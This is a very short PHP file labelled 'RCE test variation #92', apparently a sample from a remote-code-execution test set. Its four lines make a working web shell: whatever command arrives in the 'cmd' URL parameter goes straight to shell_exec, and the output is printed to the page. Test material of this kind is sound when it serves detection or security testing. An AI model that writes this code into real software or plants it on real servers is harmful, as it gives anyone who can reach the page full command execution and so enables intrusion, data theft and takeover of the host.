<?php
// RCE test variation #92
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>